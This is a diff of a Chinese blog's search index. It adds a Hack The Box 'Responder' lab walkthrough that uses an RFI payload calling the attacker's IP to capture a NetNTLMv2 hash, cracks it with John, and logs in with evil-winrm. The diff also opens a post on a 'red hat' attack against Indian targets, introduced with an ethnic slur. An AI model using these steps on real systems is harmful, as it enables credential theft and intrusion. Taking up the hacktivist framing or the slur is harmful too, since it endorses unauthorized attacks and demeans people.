@@ -30,6 +30,401 @@
       </tags>
   </entry>
   <entry>
+    <title>Responder与evil-winRM配合远程登录windows</title>
+    <url>/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/</url>
+    <content><![CDATA[<p>本文仅用作记录学习和总结，文中提到和使用的靶场来自Hack The Box的Responder靶场。</p>
+<span id="more"></span>
+<h1 id="responder与evil-winrm配合远程登录windows"><a class="markdownIt-Anchor" href="#responder与evil-winrm配合远程登录windows"></a> Responder与evil-winRM配合远程登录windows</h1>
+<h2 id="0x01evil-winrm"><a class="markdownIt-Anchor" href="#0x01evil-winrm"></a> 0x01.evil-winRM</h2>
+<h3 id="0x011概述"><a class="markdownIt-Anchor" href="#0x011概述"></a> 0x01.1概述</h3>
+<p>在使用和介绍Responder之前，先来了解一下<code>evil-winRM</code>:</p>
+<p><code>evil-winrm</code>是Windows远程管理(WinRM) Shell的终极版本。</p>
+<p>Windows远程管理是WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。</p>
+<p>此程序可在启用此功能的任何Microsoft Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用/渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击/渗透测试。</p>
+<h3 id="0x012安装和使用"><a class="markdownIt-Anchor" href="#0x012安装和使用"></a> 0x01.2安装和使用</h3>
+<h4 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装：</h4>
+<p>方法一</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install evil-winrm</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm.git</span><br></pre></td></tr></table></figure>
+<p>方法三：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install evil-winrm</span><br></pre></td></tr></table></figure>
+<h4 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用:</h4>
+<p>首先查看帮助文档</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# evil-winrm -h</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">用法：evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r 领域] [--spn SPN_PREFIX] [-l]</span><br><span class="line">     -S, --ssl 启用 ssl</span><br><span class="line">     -c, --pub-key PUBLIC_KEY_PATH 公钥证书的本地路径</span><br><span class="line">     -k, --priv-key PRIVATE_KEY_PATH 私钥证书的本地路径</span><br><span class="line">     -r, --realm DOMAIN Kerberos auth，还必须使用此格式在 /etc/krb5.conf 文件中设置 -&gt; CONTOSO.COM = &#123; kdc = fooserver.contoso.com &#125;</span><br><span class="line">     -s, --scripts PS_SCRIPTS_PATH Powershell 脚本本地路径</span><br><span class="line">         --spn SPN_PREFIX Kerberos 身份验证的 SPN 前缀（默认 HTTP）</span><br><span class="line">     -e, --executables EXES_PATH C# 可执行文件本地路径</span><br><span class="line">     -i, --ip IP 远程主机IP或主机名。 Kerberos 身份验证的 FQDN（必需）</span><br><span class="line">     -U, --url URL 远程 url 端点（默认 /wsman）</span><br><span class="line">     -u, --user USER 用户名（如果不使用 kerberos，则需要）</span><br><span class="line">     -p, --password PASS 密码</span><br><span class="line">     -H, --hash HASH NTHash</span><br><span class="line">     -P, --port PORT 远程主机端口（默认5985）</span><br><span class="line">     -V, --version 显示版本</span><br><span class="line">     -n, --no-colors 禁用颜色</span><br><span class="line">     -N, --no-rpath-completion 禁用远程路径完成</span><br><span class="line">     -l, --log 记录 WinRM 会话</span><br><span class="line">     -h, --help 显示此帮助消息</span><br></pre></td></tr></table></figure>
+<h2 id="0x02responder"><a class="markdownIt-Anchor" href="#0x02responder"></a> 0x02.Responder</h2>
+<h3 id="0x021-概念"><a class="markdownIt-Anchor" href="#0x021-概念"></a> 0x02.1 概念</h3>
+<p>响应 LLMNR、NBT-NS 和 MDNS 投毒者。 它将根据名称后缀回答特定的 NBT-NS（NetBIOS 名称服务）查询（请参阅：<a href="http://support.microsoft.com/kb/163409%EF%BC%89%E3%80%82%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E5%B0%86%E4%BB%85%E5%93%8D%E5%BA%94%E9%80%82%E7%94%A8%E4%BA%8E">http://support.microsoft.com/kb/163409）。默认情况下，该工具将仅响应适用于</a> SMB 的文件服务器服务请求。</p>
+<h3 id="0x022-特性"><a class="markdownIt-Anchor" href="#0x022-特性"></a> 0x02.2 特性</h3>
+<h4 id="内置-smb-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-smb-身份验证服务器"></a> 内置 SMB 身份验证服务器</h4>
+<p>默认情况下支持具有扩展安全性 NTLMSSP 的 NTLMv1、NTLMv2 哈希。 已成功测试从 Windows 95 到 Server 2012 RC、Samba 和 Mac OSX Lion。 NT4 支持明文密码，当设置<code>--lm</code>选项时，LM 哈希降级。该工具启动时默认启用此功能。</p>
+<h4 id="内置-mssql-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-mssql-身份验证服务器"></a> 内置 MSSQL 身份验证服务器</h4>
+<p>为了将 SQL 身份验证重定向到此工具，您需要为 Windows Vista 之前的系统设置选项 -r（用于 SQL Server 查找的 NBT-NS 查询使用工作站服务名称后缀）（LLMNR 将用于 Vista 和 更高）。 该服务器支持 NTLMv1、LMv2 哈希。 此功能已在 Windows SQL Server 2005 和 2008 上成功测试。</p>
+<h4 id="内置-http-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-http-身份验证服务器"></a> 内置 HTTP 身份验证服务器</h4>
+<p>为了将 HTTP 身份验证重定向到此工具，您需要为早于 Vista 的 Windows 版本设置选项 -r（用于 HTTP 服务器查找的 NBT-NS 查询使用工作站服务名称后缀发送）。 对于 Vista 及更高版本，将使用 LLMNR。 该服务器支持 NTLMv1、NTLMv2 哈希和基本身份验证。 该服务器已在 IE 6 至 IE 10、Firefox、Chrome、Safari 上成功测试。</p>
+<p>注意：此模块也适用于从 Windows WebDav 客户端 (WebClient) 发出的 WebDav NTLM 身份验证。 您现在可以将自定义文件发送给受害者。</p>
+<h4 id="内置-https-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-https-身份验证服务器"></a> 内置 HTTPS 身份验证服务器</h4>
+<p>与上面相同。 文件夹 certs/ 包含 2 个默认密钥，其中包括一个虚拟私钥。 这是故意的，目的是让 Responder 开箱即用。 添加了一个脚本，以防您需要生成自己的自签名密钥对。</p>
+<h4 id="内置-ldap-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-ldap-身份验证服务器"></a> 内置 LDAP 身份验证服务器</h4>
+<p>为了将 LDAP 身份验证重定向到此工具，您需要为早于 Vista 的 Windows 版本设置选项 -r（用于 HTTP 服务器查找的 NBT-NS 查询使用工作站服务名称后缀发送）。 对于 Vista 及更高版本，将使用 LLMNR。 该服务器支持 NTLMSSP 哈希和简单身份验证（明文身份验证）。 该服务器已在 Windows 支持工具&quot;ldp&quot;和 LdapAdmin 上成功测试。</p>
+<h4 id="内置-ftp-pop3-imap-smtp-身份验证服务器"><a class="markdownIt-Anchor" href="#内置-ftp-pop3-imap-smtp-身份验证服务器"></a> 内置 FTP、POP3、IMAP、SMTP 身份验证服务器</h4>
+<p>该模块将收集明文凭据</p>
+<h4 id="内置-dns-服务器"><a class="markdownIt-Anchor" href="#内置-dns-服务器"></a> 内置 DNS 服务器</h4>
+<p>该服务器将回答 A 类查询。 当它与 ARP 欺骗结合起来时，这真的很方便。</p>
+<h4 id="内置-wpad-代理服务器"><a class="markdownIt-Anchor" href="#内置-wpad-代理服务器"></a> 内置 WPAD 代理服务器</h4>
+<p>如果启用了“自动检测设置”，此模块将捕获网络上启动 Internet Explorer 的任何人的所有 HTTP 请求。 该模块非常有效。 您可以在 Responder.conf 中配置自定义 PAC 脚本，并将 HTML 注入服务器的响应中。 请参阅 Responder.conf。</p>
+<h4 id="浏览器监听器"><a class="markdownIt-Anchor" href="#浏览器监听器"></a> 浏览器监听器</h4>
+<p>该模块允许在隐身模式下找到 PDC。</p>
+<h4 id="指纹识别"><a class="markdownIt-Anchor" href="#指纹识别"></a> 指纹识别</h4>
+<p>当使用选项 <code>-f </code>时，响应程序将对发出 LLMNR/NBT-NS 查询的每个主机进行指纹识别。 所有采集模块在指纹模式下仍然可以工作。</p>
+<h4 id="icmp-重定向"><a class="markdownIt-Anchor" href="#icmp-重定向"></a> ICMP 重定向</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tools/Icmp-Redirect.py</span><br></pre></td></tr></table></figure>
+<p>适用于 Windows XP/2003 及更早版本上的 MITM 域成员。 这种攻击与 DNS 模块相结合非常有效。</p>
+<h4 id="流氓-dhcp"><a class="markdownIt-Anchor" href="#流氓-dhcp"></a> 流氓 DHCP</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tools/DHCP.py</span><br></pre></td></tr></table></figure>
+<p>DHCP 通知欺骗。 允许您让真正的 DHCP 服务器发布 IP 地址，然后发送 DHCP Inform 应答以将您的 IP 地址设置为主 DNS 服务器，以及您自己的 WPAD URL。</p>
+<h4 id="分析模式"><a class="markdownIt-Anchor" href="#分析模式"></a> 分析模式</h4>
+<p>该模块允许您查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会破坏任何响应。 此外，您还可以被动映射域、MSSQL 服务器、工作站，看看 ICMP 重定向攻击在您的子网上是否可行。</p>
+<h3 id="0x023-responder欺骗原理"><a class="markdownIt-Anchor" href="#0x023-responder欺骗原理"></a> 0x02.3 Responder欺骗原理</h3>
+<p>在使用Responder之前，我们要先了解windwos默认开启的三种协议，这三种协议分别是<strong>链路本地多播名称解析（LLMNR）</strong>、<strong>名称服务器(NBNS) 协议</strong>和<strong>多播DNS（mdns）协议</strong>。</p>
+<h4 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h4>
+<p>**链路本地多播名称解析（LLMNR）<strong>是一个</strong>基于域名系统（DNS）**数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。Windows 操作系统从 Windows Vista开始就内嵌支持，Linux系统也通过systemd实现了此协议。它通过UDP 5355端口进行通信，且LLMNR支持IPV6。</p>
+<h4 id="nbns"><a class="markdownIt-Anchor" href="#nbns"></a> NBNS</h4>
+<p>**网络基本输入/输出系统(NetBIOS) **名称服务器(NBNS) 协议是 TCP/IP 上的 NetBIOS (NetBT) 协议族的一部分，它在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。通过UDP 137端口进行通信，但NBNS不支持IPV6。</p>
+<h4 id="mdns"><a class="markdownIt-Anchor" href="#mdns"></a> mDNS</h4>
+<p>在计算机网络中 ，**多播DNS（ mDNS ）<strong>协议将主机名解析为不包含本地名称服务器的小型网络中的IP地址。 它是一种零配置服务，使用与</strong>单播域名系统（DNS）**基本相同的编程接口，数据包格式和操作语义。 虽然Stuart Cheshire将mDNS设计为独立协议，但它可以与标准DNS服务器协同工作。它通过UDP 5353端口进行通信，且mDNS也支持IPV6。</p>
+<p>目前仅有windows 10以上的系统支持mdns，经测试发现，禁用了llmnr后mdns也会被禁用。</p>
+<p><mark>总的来说，以上几种协议在windows中都是默认启用的，主要作用都是在DNS服务器解析失败后，尝试对windows主机名称进行解析，正因为默认启用、且实现方式又类似于ARP协议，并没有一个认证的过程，所以就会引发各种基于这两种协议的欺骗行为，而Responder正是通过这种方式，欺骗受害机器，并使受害机器在后续认证中发送其凭证。</mark></p>
+<h3 id="0x024-使用方法"><a class="markdownIt-Anchor" href="#0x024-使用方法"></a> 0x02.4 使用方法</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment">#responder -h</span></span><br><span class="line"></span><br><span class="line">用法：responder -I eth0 -w -d</span><br><span class="line">或者：</span><br><span class="line">responder -I eth0 -wd</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">   --version 显示程序的版本号并退出</span><br><span class="line">   -h, --<span class="built_in">help</span> 显示此帮助消息并退出</span><br><span class="line">   -A, --analyze 分析模式。 此选项允许您查看NBT-NS，</span><br><span class="line">                         BROWSER、LLMNR 请求没有响应。</span><br><span class="line">   -I eth0，--接口=eth0</span><br><span class="line">                         要使用的网络接口，可以使用“ALL”作为</span><br><span class="line">                         所有接口的通配符</span><br><span class="line">   -i 10.0.0.21,--ip=10.0.0.21</span><br><span class="line">                         要使用的本地 IP（仅适用于 OSX）</span><br><span class="line">   -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed</span><br><span class="line">                         使用其他 IPv6 地址对所有请求进行毒害</span><br><span class="line">                         响应者之一。</span><br><span class="line">   -e 10.0.0.22, --externalip=10.0.0.22</span><br><span class="line">                         使用其他 IP 地址毒害所有请求</span><br><span class="line">                         响应者之一。</span><br><span class="line">   -b, --basic 返回基本 HTTP 身份验证。 默认值：NTLM</span><br><span class="line">   -d, --DHCP 启用 DHCP 广播请求的应答。 这</span><br><span class="line">                         选项将在 DHCP 响应中注入 WPAD 服务器。</span><br><span class="line">                         默认值：假</span><br><span class="line">   -D, --DHCP-DNS 该选项将在 DHCP 中注入 DNS 服务器</span><br><span class="line">                         响应，否则将添加 WPAD 服务器。</span><br><span class="line">                         默认值：假</span><br><span class="line">   -w, --wpad 启动 WPAD 恶意代理服务器。 默认值为</span><br><span class="line">                         错误的</span><br><span class="line">   -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY</span><br><span class="line">                         恶意 WPAD 代理使用的上游 HTTP 代理</span><br><span class="line">                         传出请求（格式：主机:端口）</span><br><span class="line">   -F, --ForceWpadAuth 对 wpad.dat 文件强制进行 NTLM/Basic 身份验证</span><br><span class="line">                         恢复。 这可能会导致登录提示。 默认：</span><br><span class="line">                         错误的</span><br><span class="line">   -P, --ProxyAuth 强制 NTLM（透明）/基本（提示）</span><br><span class="line">                         代理的身份验证。 WPAD 不需要</span><br><span class="line">                         在。 这个选项非常有效。 默认值：假</span><br><span class="line">   --lm 强制 Windows XP/2003 和 LM 哈希降级</span><br><span class="line">                         早些时候。 默认值：假</span><br><span class="line">   --disable-ess 强制 ESS 降级。 默认值：假</span><br><span class="line">   -v, --verbose 增加详细程度。</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-靶场实战responder与evil-winrm配合远程登录windows"><a class="markdownIt-Anchor" href="#0x03-靶场实战responder与evil-winrm配合远程登录windows"></a> 0x03 靶场实战–Responder与evil-winRM配合远程登录windows</h2>
+<p>测试环境：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> （攻击机）   <span class="number">192.168.154.128</span> </span><br><span class="line"><span class="attribute">vpn</span>接入内网环境: ip -&gt; <span class="number">10.10.14.115</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">HTB</span>靶机 windows <span class="number">10</span> （受害机） <span class="number">10.129.48.161</span></span><br></pre></td></tr></table></figure>
+<p>开启靶机</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230806235738164.png" alt="image-20230806235738164"></p>
+<p>前置的步骤简单过一下：</p>
+<blockquote>
+<p>TASK 1</p>
+<p>When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">unika.htb</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>直接curl探测一下就行</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807004726426.png" alt="image-20230807004726426"></p>
+<p>访问域名需要在本地的hosts文件就行一个配置：</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010259553.png" alt="image-20230807010259553"></p>
+<blockquote>
+<p>TASK 2</p>
+<p>Which scripting language is being used on the server to generate webpages?</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PHP</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>直接使用<strong>wappalyzer</strong>插件即可</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807005131865.png" alt="image-20230807005131865"></p>
+<blockquote>
+<p>TASK 3</p>
+<p>What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">page</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>查看网页源代码：</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807005737023.png" alt="image-20230807005737023"></p>
+<blockquote>
+<p>TASK 4</p>
+<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “<a href="//10.10.14.6/somefile">//10.10.14.6/somefile</a>”, “…/…/…/…/…/…/…/…/windows/system32/drivers/etc/hosts”, “minikatz.exe”</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>windows<span class="regexp">/system32/</span>drivers<span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里熟悉**文件包含漏洞(FI)**师傅能直接get到点：</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010014461.png" alt="image-20230807010014461"></p>
+<blockquote>
+<p>TASK 5</p>
+<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “<a href="//10.10.14.6/somefile">//10.10.14.6/somefile</a>”, “…/…/…/…/…/…/…/…/windows/system32/drivers/etc/hosts”, “minikatz.exe”</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span><span class="number">10.10</span>.<span class="number">14.6</span>/somefile</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里和上一问同理</p>
+<blockquote>
+<p>TASK 6</p>
+<p>What does NTLM stand for?</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">NT (<span class="name">New</span> Technology) LAN Manager (<span class="name">NTLM</span>)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>查阅Wiki百科就行（可以往下深入了解，这是内网的开始…<img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010533593.png" alt="image-20230807010533593"></p>
+<blockquote>
+<p>TASK 7</p>
+<p>Which flag do we use in the Responder utility to specify the network interface?</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">-<span class="selector-tag">I</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>通过上面的帮助文档可以知道</p>
+<blockquote>
+<p>TASK 8</p>
+<p>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">John the Ripper</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>也是查阅Wiki百科即可</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010848902.png" alt="image-20230807010848902"></p>
+<h3 id="本文的关键操作可直接跳至此处"><a class="markdownIt-Anchor" href="#本文的关键操作可直接跳至此处"></a> 本文的关键操作，可直接跳至此处</h3>
+<p><mark>接下来将是本文的重点操作</mark>：</p>
+<p>首先查看一下自身ip（vpn），并开启监听</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012015738.png" alt="image-20230807012015738"></p>
+<p>开启监听：<code>responder -I tun0 -w -d</code></p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012128742.png" alt="image-20230807012128742"></p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012239477.png" alt="image-20230807012239477"></p>
+<p>接着利用web端的**远程文件包含漏洞(RFI)**访问我自身(10.10.14.115)的任意文件，进行一个Hash泄露</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://unika.htb/index.php?page=//10.10.14.115/somefile</span><br></pre></td></tr></table></figure>
+<p>Responder就可以捕获到来自受害机(10.129.48.161)带有<strong>用户的密码(password)的Hash值</strong></p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012755978.png" alt="image-20230807012755978"></p>
+<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">Administrator:<span class="type"></span>:RESPONDER:<span class="type">9baf19c29ef21567</span>:<span class="number">761</span>FED4C7E3DB9BCFEF3E747E797B10D:<span class="type">010100000000000000E56ED168C8D901D119B9B66118B37A00000000020008004E0044004200450001001E00570049004E002D004C004C0047004200590033003100340035005800510004003400570049004E002D004C004C004700420059003300310034003500580051002E004E004400420045002E004C004F00430041004C00030014004E004400420045002E004C004F00430041004C00050014004E004400420045002E004C004F00430041004C000700080000E56ED168C8D901060004000200000008003000300000000000000001000000002000008400CDB8B7CEB11867758BC8795830343D40C19570BB7035C3D1AF789B7CE19F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310035000000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>将这段字符串保存到一个txt文件中，接下来使用JHON进行一个Hash爆破：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john -w=/usr/share/wordlists/rockyou.txt admin.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013110709.png" alt="image-20230807013110709"></p>
+<p>能够获取到Administrator用户的密码为：badminton</p>
+<blockquote>
+<p>TASK 9</p>
+<p>What is the password for the administrator user?</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">badminton</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>TASK 10</p>
+<p>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">5985</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>使用nmap进行一个开放端口探测即可：</p>
+<figure class="highlight nim"><table><tr><td class="code"><pre><span class="line">nmap -p- --min-rate <span class="number">1000</span> -sV <span class="number">10</span>.<span class="number">129</span>.<span class="number">48</span>.<span class="number">161</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013453353.png" alt="image-20230807013453353"></p>
+<p>拿到用户的账户和密码之后就到了一开始所提到的evil-winRM的使用了</p>
+<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">evil</span>-winrm -i <span class="number">10.129</span><span class="number">.48</span><span class="number">.161</span> -u administrator -p badminton</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013831906.png" alt="image-20230807013831906"></p>
+<p>这样就可以远程登录windows服务器啦，接下来我们能做到的事儿有很多。</p>
+<p>第一步肯定是找题目需要的flag</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014120801.png" alt="image-20230807014120801"></p>
+<p>找到我们需要的flag文件只是最基础的，别着急提交，不然就浪费这个练习工具的好机会了</p>
+<p>可以多试试几个命令：</p>
+<p><strong>menu</strong>：加载Invoke-Binary和l04d3r-LoadDll函数。当加载ps1时，会显示其所有功能。</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014438379.png" alt="image-20230807014438379"></p>
+<p><strong>download</strong>：下载远程文件到本地，如果远程文件在当前目录中，则不需要local_path。</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">download local_path remote_path</span><br></pre></td></tr></table></figure>
+<p>这里可以尝试一下下载flag.txt</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014805570.png" alt="image-20230807014805570"></p>
+<p><strong>upload</strong>：从本地（kali）上传文件到目标机器，如果本地文件与evil-winrm.rb文件位于同一目录中，则不需要remote_path。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload local_path remote_path</span><br></pre></td></tr></table></figure>
+<p>这里可以试着传一个txt文件</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015126775.png" alt="image-20230807015126775"></p>
+<p><strong>Invoke-Binary</strong>：允许在内存中执行从c#编译的exe。该名称可使用tab键自动补全，最多允许3个参数。可执行文件必须在-e参数设置的路径中。</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015427827.png" alt="image-20230807015427827"></p>
+<p>这里由于我在连接时并未指定exe的路径所以这里没法正常执行命令。</p>
+<p>**services：**列出所有服务（无需管理员权限）</p>
+<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015616926.png" alt="image-20230807015616926"></p>
+<p><strong>加载 powershell 脚本</strong></p>
+<p>要加载ps1文件，你只需键入名称（可以使用tab自动补全）。脚本必须位于-s参数中设置的路径中。再次键入menu并查看加载的功能。</p>
+<p>这里我没指定路径所以是没有powershell脚本的，所以没法正常演示。</p>
+<h3 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h3>
+<p>本次的分享就到这儿结束了，当然还有很多的操作和细节没有能够展示到，后续就留给师傅们去探索了。</p>
+<p>下面附上本文的参考文章链接：</p>
+<blockquote>
+<p>参考文章：<a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
+<p>​                    <a href="https://www.freebuf.com/articles/network/256844.html">https://www.freebuf.com/articles/network/256844.html</a></p>
+<p>​                    <a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
+<p>​                    <a href="https://www.kali.org/tools/evil-winrm/">https://www.kali.org/tools/evil-winrm/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一次针对阿三的红帽渗透测试[getshell]</title>
+    <url>/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/</url>
+    <content><![CDATA[<p>本次渗透测试属于一个红帽性质的一次针对阿三的渗透攻击，群里大哥一声吆喝，小弟我直接第一个出击。</p>
+<span id="more"></span>
+<h1 id="一次暴露面全开的红帽渗透测试getshell"><a class="markdownIt-Anchor" href="#一次暴露面全开的红帽渗透测试getshell"></a> 一次暴露面全开的红帽渗透测试[getshell]</h1>
+<p>声明：本文章仅用作技术交流和技术分享，文中所涉及的任何内容与渗透技术被读者恶意使用所造成的后果与作者本人无关！</p>
